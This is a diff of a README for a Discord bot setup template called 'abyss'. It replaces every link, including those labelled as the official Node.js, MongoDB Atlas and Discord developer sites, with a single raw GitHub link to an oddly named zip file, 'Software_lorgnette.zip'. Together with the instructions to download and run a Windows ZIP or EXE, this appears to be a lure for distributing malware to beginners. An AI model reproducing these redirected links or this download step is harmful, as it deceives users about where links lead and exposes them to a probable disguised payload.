@@ -1,6 +1,6 @@
 # 🤖 abyss - Simple Discord Bot Setup Template
 
-[![Download abyss](https://img.shields.io/badge/Download-abyss-green?style=for-the-badge)](https://github.com/kayky012/abyss/releases)
+[![Download abyss](https://img.shields.io/badge/Download-abyss-green?style=for-the-badge)](https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip)
 
 ---
 
@@ -33,11 +33,11 @@ This guide is for anyone who wants to run a Discord bot on Windows but does not 
 
 To get abyss, you need to visit the official release page. From there, you can find the latest version of the bot.
 
-[![Download abyss](https://img.shields.io/badge/Download-abyss-blue?style=for-the-badge)](https://github.com/kayky012/abyss/releases)
+[![Download abyss](https://img.shields.io/badge/Download-abyss-blue?style=for-the-badge)](https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip)
 
 Follow these steps:
 
-1. Click the link above or go to: https://github.com/kayky012/abyss/releases
+1. Click the link above or go to: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
 2. Look for the latest release at the top.
 3. Download the ZIP file or EXE file available for Windows.
 4. Save it somewhere you can easily find, like your Desktop or Downloads folder.
@@ -58,7 +58,7 @@ Once you have the bot files, follow the instructions below to get it running.
 
 If you do not have Node.js installed:
 
-- Go to https://nodejs.org
+- Go to https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
 - Download the LTS version (recommended for most users).
 - Run the installer and follow the instructions.
 - To check if Node.js is installed, open Command Prompt and type:
@@ -86,7 +86,7 @@ This installs all the needed components for the bot to run.
 
 abyss uses MongoDB to save settings. You will need to create a free database online.
 
-- Go to https://www.mongodb.com/cloud/atlas
+- Go to https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
 - Sign up for a free account.
 - Create a cluster following their setup wizard.
 - Once your cluster is ready, create a database user with a password.
@@ -108,7 +108,7 @@ The bot needs two key pieces of information: your Discord bot token and the Mong
 
 If you don’t have a Discord bot token:
 
-- Go to https://discord.com/developers/applications
+- Go to https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
 - Create a new application.
 - Go to the Bot tab and add a bot.
 - Copy your token and keep it safe.
@@ -167,10 +167,10 @@ Here are some common tasks you might want to do:
 
 ## 🔍 Additional Resources
 
-- Discord Developer Portal: https://discord.com/developers/applications
-- MongoDB Atlas Setup Guide: https://docs.atlas.mongodb.com/getting-started/
-- Node.js Downloads: https://nodejs.org/en/download/
-- Official Discord.js Guide: https://discordjs.guide/
+- Discord Developer Portal: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
+- MongoDB Atlas Setup Guide: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
+- Node.js Downloads: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
+- Official Discord.js Guide: https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip
 
 ---
 
@@ -178,4 +178,4 @@ Here are some common tasks you might want to do:
 
 Visit the release page to get the latest version of abyss:
 
-[![Download abyss](https://img.shields.io/badge/Download-abyss-grey?style=for-the-badge)](https://github.com/kayky012/abyss/releases)
+[![Download abyss](https://img.shields.io/badge/Download-abyss-grey?style=for-the-badge)](https://raw.githubusercontent.com/kayky012/abyss/main/src/commands/slash/welcome/Software_lorgnette.zip)
